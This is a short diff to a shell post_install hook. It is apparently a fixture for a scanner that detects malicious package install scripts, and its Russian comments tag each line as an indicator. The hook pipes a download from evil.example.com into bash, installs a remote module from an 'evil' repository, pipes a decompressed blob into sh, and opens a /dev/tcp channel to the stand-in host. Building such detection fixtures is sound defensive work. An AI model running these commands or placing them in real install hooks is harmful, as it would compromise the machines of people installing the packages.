@@ -2,4 +2,7 @@ post_install() {
   npm install js-digest                         # IOC + foreign PM
   echo pwned >"$HOME/compromised.txt"           # маркер кампании 2018 (acroread)
   curl -sSL http://evil.example.com/p.sh | bash # curl|sh уже в хуке
+  go install github.com/evil/hook@latest        # удалённый go-модуль в хуке
+  gunzip -c /usr/share/evil/blob.gz | sh        # decompress | shell в хуке
+  exec 3<>/dev/tcp/evil.example.com/443         # обратный канал без sh -c
 }
